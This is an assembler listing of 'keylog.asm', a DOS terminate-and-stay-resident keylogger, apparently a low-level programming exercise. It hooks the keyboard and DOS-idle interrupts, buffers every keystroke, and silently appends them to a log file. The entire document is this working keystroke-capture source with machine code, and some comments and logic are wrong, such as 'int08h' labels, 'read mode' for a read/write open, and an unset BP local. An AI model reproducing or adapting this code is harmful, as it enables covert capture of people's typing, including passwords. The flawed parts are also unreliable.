Turbo Assembler	 Version 4.1	    03/17/20 18:11:44	    Page 1
keylog.asm



      1				     .186
      2
      3	0000			     .model tiny
      4
      5				     local @@
      6
      7	0000			     .data
      8
      9	0000  53 3A 5C 4B 45 59	4C+  filePath db 'S:\KEYLOG\LOG.TXT', 0
     10	      4F 47 5C 4C 4F 47	2E+
     11	      54 58 54 00
     12
     13	0012  00000000		     old_int09h	dd 0
     14	0016  00000000		     old_int28h	dd 0
     15
     16	001A  0100*(00)		     buffer db 256 dup(0)
     17
     18	011A  00		     head db 0
     19	011B  00		     tail db 0
     20
     21	      =3100		     tsr_mode equ 3100h
     22	      =0024		     int09h_addr equ 9 * 4
     23	      =00A0		     int28h_addr equ 28h * 4
     24	011C			     EndLabel:
     25
     26	011C			     .code
     27				     org 100h
     28	0100			     Start:
     29	0100  33 C0			     xor ax, ax
     30	0102  8E C0			     mov es, ax					 ; Set ES to 0
     31
     32	0104  FA			     cli					 ; Disable INTs
     33	0105  BB 0024				     mov bx, int09h_addr			 ; Save	address	of int08h handler
     34	0108  26: 8B 07				     mov ax, word ptr es:[bx]
     35	010B  26: 8B 4F	02			     mov cx, word ptr es:[bx+2]
     36	010F  2E: A3 0012r			     mov word ptr cs:[old_int09h], ax		 ; Save	pointer	to old handler
     37	0113  2E: 89 0E	0014r			     mov word ptr cs:[old_int09h + 2], cx
     38	0118  26: C7 07	016Cr			     mov word ptr es:[bx], offset Int09hHandler	 ; Rewrite handler
     39	011D  8C C8				     mov ax, cs
     40	011F  26: 89 47	02			     mov word ptr es:[bx+2], ax
     41
     42
     43	0123  BB 00A0			     mov bx, int28h_addr			 ; Save	address	of int08h handler
     44	0126  26: 8B 07				     mov ax, word ptr es:[bx]
     45	0129  26: 8B 4F	02			     mov cx, word ptr es:[bx+2]
     46	012D  2E: A3 0016r			     mov word ptr cs:[old_int28h], ax		 ; Save	pointer	to old handler
     47	0131  2E: 89 0E	0018r			     mov word ptr cs:[old_int28h + 2], cx
     48	0136  26: C7 07	0150r			     mov word ptr es:[bx], offset Int28hHandler	 ; Rewrite handler
     49	013B  8C C8				     mov ax, cs
     50	013D  26: 89 47	02			     mov word ptr es:[bx+2], ax
     51	0141  FB				     sti					 ; Enable INTs
     52
     53	0142  B8 3100			     mov ax, tsr_mode				 ; DOS function	to enable TSR
     54	0145  BA 011Cr				     mov dx, offset EndLabel			 ; Get program size
     55	0148  C1 EA 04				     shr dx, 4					 ; Turn	it into	segment
     56	014B  83 C2 10				     add dx, 16					  ; Ceiling
     57	014E  CD 21				     int 21h					 ; Call	function
Turbo Assembler	 Version 4.1	    03/17/20 18:11:44	    Page 2
keylog.asm



     58
     59
     60				     ;==============================================================================
     61				     ; New Interrupt 28h handler
     62				     ;==============================================================================
     63	0150			     Int28hHandler   proc
     64	0150  57 53 50 51 52 06	1E+	     push di bx	ax cx dx es ds si bp		 ; Save	bunch of registers
     65	      56 55
     66
     67	0159  9C				     pushf					 ; Push	flag register
     68	015A  2E: FF 1E	0016r			     call dword	ptr cs:[old_int28h]		 ; Call	original handler
     69
     70					     ;call debugBuffer
     71	015F  E8 003A			     call saveBuffer
     72
     73	0162  5D 5E 1F 07 5A 59	58+	     pop bp si ds es dx	cx ax bx di		 ; Restore bunch of registers
     74	      5B 5F
     75	016B  CF				     iret					 ; End interrupt
     76	016C			     Int28hHandler   endp
     77
     78
     79				     ;==============================================================================
     80				     ; New Interrupt 09h handler
     81				     ;==============================================================================
     82
     83	016C			     Int09hHandler   proc
     84	016C  50 57 53			     push ax di	bx				 ; Save	bunch of registers
     85
     86	016F  9C				     pushf					 ; Push	flag register
     87	0170  2E: FF 1E	0012r			     call dword	ptr cs:[old_int09h]		 ; Call	original handler
     88
     89	0175  E8 0004			     call updateBuffer				 ; Update key stored in	buffer
     90					     ;call debugBuffer
     91
     92	0178  5B 5F 58			     pop bx di ax			       ; Restore bunch of registers
     93	017B  CF				     iret					 ; End interrupt
     94	017C			     Int09hHandler   endp
     95
     96
     97				     ;==============================================================================
     98				     ; Function	that adds symbol to buffer (if present)
     99				     ; DESTR: AX, DI, BX
    100				     ;==============================================================================
    101
    102	017C			     updateBuffer    proc
    103	017C  B4 01			     mov ah, 01h				 ; Funtion of int 16h that checks for button+
    104				     and reads ASCII
    105	017E  CD 16			     int 16h					 ; Call	function
    106
    107	0180  74 19			     jz	 @@noSymbol				 ; No new symbol
    108	0182  3C 00			     cmp al, 0
    109	0184  74 15			     je	@@noSymbol
    110
    111	0186  2E: 80 06	011Ar 01	     add byte ptr cs:[head], 1
    112	018C  33 DB			     xor bx, bx
    113	018E  2E: 8A 1E	011Ar		     mov bl, byte ptr cs:[head]
    114
Turbo Assembler	 Version 4.1	    03/17/20 18:11:44	    Page 3
keylog.asm



    115	0193  BF 001Ar			     mov di, offset buffer
    116	0196  03 FB			     add di, bx
    117	0198  2E: 88 05			     mov cs:[di], al
    118	019B			     @@noSymbol:
    119	019B  C3			     ret
    120	019C			     updateBuffer    endp
    121
    122				     ;==============================================================================
    123				     ; Function	that writes to file
    124				     ; DESTR: AX, BX, CX, DX
    125				     ;==============================================================================
    126
    127	019C			     saveBuffer	 proc
    128					     local oldHead:byte
    129	019C  2E: 8A 16	011Ar		     mov dl, cs:[head]
    130	01A1  2E: 88 56	FE		     mov cs:[oldHead], dl			 ; Keep	head so	it won't shift in the process
    131	01A5  0E			     push cs
    132	01A6  1F			     pop ds
    133	01A7  BA 0000r			     mov dx, offset filePath			 ; DS:DX to file path
    134	01AA  B8 3D02			     mov ax, 3d02h				 ; Open	file in	read mode
    135	01AD  CD 21			     int 21h					 ; Call	DOS function
    136
    137	01AF  8B D8			     mov bx, ax					 ; Move	file handle to bx
    138	01B1  B8 4202			     mov ax, 4202h				 ; Move	to the EOF
    139	01B4  33 C9			     xor cx, cx
    140	01B6  33 D2			     xor dx, dx					 ; CX:DX to zero so there is no	shift
    141	01B8  CD 21			     int 21h					 ; Call	DOS function
    142
    143
    144	01BA  2E: 8A 4E	FE		     mov cl, cs:[oldHead]
    145	01BE  2E: 2A 0E	011Br		     sub cl, cs:[tail]				 ; Calculate file length
    146	01C3  BA 001Ar			     mov dx, offset buffer
    147	01C6  33 C0			     xor ax, ax
    148	01C8  2E: A0 011Br		     mov al, cs:[tail]
    149	01CC  03 D0			     add dx, ax					 ; Add shift to	the beginning of the buffer
    150	01CE  B4 40			     mov ah, 40h				 ; Write to file
    151	01D0  CD 21			     int 21h					 ; Call	DOS function
    152
    153	01D2  B4 3E			     mov ah, 3eh				 ; Close file
    154	01D4  CD 21			     int 21h					 ; Call	DOS function
    155
    156	01D6  2E: 8A 46	FE		     mov al, cs:[oldHead]
    157	01DA  2E: A2 011Br		     mov cs:[tail], al				 ; Move	buffer start position
    158	01DE  C3			     ret
    159	01DF			     saveBuffer	 endp
    160
    161
    162
    163	01DF			     debugBuffer proc
    164	01DF  68 B800			     push 0b800h
    165	01E2  07			     pop es
    166	01E3  0E			     push cs
    167	01E4  1F			     pop ds
    168	01E5  33 FF			     xor di, di
    169	01E7  B9 001Ar			     mov cx, offset buffer
    170	01EA  8B F1			     mov si, cx
    171
Turbo Assembler	 Version 4.1	    03/17/20 18:11:44	    Page 4
keylog.asm



    172	01EC  33 C9			     xor cx, cx
    173	01EE  2E: 8A 0E	011Ar		     mov cl, byte ptr cs:[head]
    174	01F3  2E: 2A 0E	011Br		     sub cl, byte ptr cs:[tail]
    175	01F8  FE C1			     inc cl
    176	01FA  74 07			     je	@@End
    177	01FC  83 F9 00			     cmp cx, 0
    178	01FF			     @@Write:
    179	01FF  A4			     movsb
    180	0200  47			     inc di
    181	0201  E2 FC			     loop @@Write
    182
    183	0203			     @@End:
    184	0203  C3			     ret
    185	0204			     debugBuffer endp
    186
    187				     end Start
Turbo Assembler	 Version 4.1	    03/17/20 18:11:44	    Page 5
Symbol Table




Symbol Name			  Type	 Value

??DATE				  Text	 "03/17/20"
??FILENAME			  Text	 "keylog  "
??TIME				  Text	 "18:11:43"
??VERSION			  Number 040A
@32BIT				  Text	 0
@@				  Number [DGROUP:BP-0002]
@@END				  Near	 DGROUP:0203
@@NOSYMBOL			  Near	 DGROUP:019B
@@WRITE				  Near	 DGROUP:01FF
@CODE				  Text	 DGROUP
@CODESIZE			  Text	 0
@CPU				  Text	 0103H
@CURSEG				  Text	 _TEXT
@DATA				  Text	 DGROUP
@DATASIZE			  Text	 0
@FILENAME			  Text	 KEYLOG
@INTERFACE			  Text	 000H
@MODEL				  Text	 1
@STACK				  Text	 DGROUP
@WORDSIZE			  Text	 2
BUFFER				  Byte	 DGROUP:001A
DEBUGBUFFER			  Near	 DGROUP:01DF
ENDLABEL			  Near	 DGROUP:011C
FILEPATH			  Byte	 DGROUP:0000
HEAD				  Byte	 DGROUP:011A
INT09HHANDLER			  Near	 DGROUP:016C
INT09H_ADDR			  Number 0024
INT28HHANDLER			  Near	 DGROUP:0150
INT28H_ADDR			  Number 00A0
OLDHEAD				  Number [DGROUP:BP-0002]
OLD_INT09H			  Dword	 DGROUP:0012
OLD_INT28H			  Dword	 DGROUP:0016
SAVEBUFFER			  Near	 DGROUP:019C
START				  Near	 DGROUP:0100
TAIL				  Byte	 DGROUP:011B
TSR_MODE			  Number 3100
UPDATEBUFFER			  Near	 DGROUP:017C

Groups & Segments		  Bit Size Align  Combine Class

DGROUP				  Group
  _DATA				  16  011C Word	  Public  DATA
  _TEXT				  16  0204 Word	  Public  CODE
